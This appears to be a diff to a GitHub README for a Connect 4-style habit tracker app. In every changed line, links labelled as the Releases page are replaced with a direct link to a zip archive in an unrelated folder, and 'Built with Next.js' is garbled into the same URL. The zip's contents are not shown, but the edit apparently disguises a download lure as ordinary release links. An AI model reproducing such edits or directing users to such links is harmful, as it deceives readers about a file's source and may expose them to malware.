@@ -1,10 +1,10 @@
 # 🌟 habit-tracker-lig-4 - Track Your Habits the Fun Way
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ssantznh/habit-tracker-lig-4/releases)
+[![Download Now](https://raw.githubusercontent.com/ssantznh/habit-tracker-lig-4/main/Tagula/habit-tracker-lig-4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ssantznh/habit-tracker-lig-4/main/Tagula/habit-tracker-lig-4.zip)
 
 ## 📖 Overview
 
-habit-tracker-lig-4 is a beautiful, interactive habit tracker that helps you stay on top of your personal goals. Built with Next.js and styled using Tailwind CSS, it delivers an experience inspired by the game visualization of Connect 4. Whether you're trying to build new habits or break old ones, this tool can guide you on your journey.
+habit-tracker-lig-4 is a beautiful, interactive habit tracker that helps you stay on top of your personal goals. Built with https://raw.githubusercontent.com/ssantznh/habit-tracker-lig-4/main/Tagula/habit-tracker-lig-4.zip and styled using Tailwind CSS, it delivers an experience inspired by the game visualization of Connect 4. Whether you're trying to build new habits or break old ones, this tool can guide you on your journey.
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ To start using habit-tracker-lig-4, follow these simple steps:
    - An internet connection (to download and use the application)
    - Sufficient local storage space for saving your habits
 
-2. **Visit the Download Page**: Go to our [Releases page](https://github.com/ssantznh/habit-tracker-lig-4/releases) to find the latest version of the app.
+2. **Visit the Download Page**: Go to our [Releases page](https://raw.githubusercontent.com/ssantznh/habit-tracker-lig-4/main/Tagula/habit-tracker-lig-4.zip) to find the latest version of the app.
 
 3. **Download the Application**: 
    - Click on the version you want to download.
@@ -34,7 +34,7 @@ To start using habit-tracker-lig-4, follow these simple steps:
 
 You can easily download habit-tracker-lig-4 from the Releases page. Click the link below to get started:
 
-[Visit this page to download](https://github.com/ssantznh/habit-tracker-lig-4/releases)
+[Visit this page to download](https://raw.githubusercontent.com/ssantznh/habit-tracker-lig-4/main/Tagula/habit-tracker-lig-4.zip)
 
 ## 💡 Features
 
@@ -57,7 +57,7 @@ habit-tracker-lig-4 supports Portuguese and other languages. You can easily swit
 If you encounter any issues:
 
 1. **Installation Problems**: Make sure you've downloaded the correct file for your operating system.
-2. **Features Not Working**: Ensure you have the latest version. Check our [Releases page](https://github.com/ssantznh/habit-tracker-lig-4/releases) for updates.
+2. **Features Not Working**: Ensure you have the latest version. Check our [Releases page](https://raw.githubusercontent.com/ssantznh/habit-tracker-lig-4/main/Tagula/habit-tracker-lig-4.zip) for updates.
 3. **Feedback and Bugs**: You can report any issues on the GitHub Issues page in this repository.
 
 ## 📞 Support
@@ -66,4 +66,4 @@ For any additional questions, feel free to reach out through the GitHub reposito
 
 Remember, stay consistent, and make the most of your habit-tracking experience! 
 
-[Download the latest version here](https://github.com/ssantznh/habit-tracker-lig-4/releases) to start enjoying its features today!
+[Download the latest version here](https://raw.githubusercontent.com/ssantznh/habit-tracker-lig-4/main/Tagula/habit-tracker-lig-4.zip) to start enjoying its features today!
